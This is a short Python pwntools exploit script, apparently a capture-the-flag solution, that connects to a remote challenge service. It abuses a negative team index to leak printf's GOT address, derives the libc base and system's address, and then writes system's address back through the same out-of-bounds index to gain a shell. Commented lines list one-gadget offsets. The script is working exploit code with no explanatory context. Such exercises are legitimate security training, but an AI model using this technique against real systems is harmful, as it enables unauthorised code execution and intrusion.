from pwn import *
# p = process("./chall")
p = remote("15.164.30.24", 7736)
libc = ELF("./libc.so.6")

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"which team? ", b"-13")

p.recvuntil(b"selected team: ")
printf_got = u64(p.recvline()[:-1].ljust(8, b"\x00"))
success("printf: " + hex(printf_got))
libc_base = printf_got - libc.symbols["printf"]
success("libc_base: " + hex(libc_base))
system = libc_base + libc.symbols["system"]
success("system: " + hex(system))
p.sendlineafter(b"Who? ", b"sy46")

# gdb.attach(p)
system = str(hex(system))
system = system[2:]
print(system)
p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"select team: ", b"-13")

# one = libc_base + 0xebc85 # 0xebc81 0xebc85 0xebc88 0xebce2 0xebd38 0xebd3f 0xebd43
p.sendlineafter(b"player: ", str(system).encode())

p.interactive()
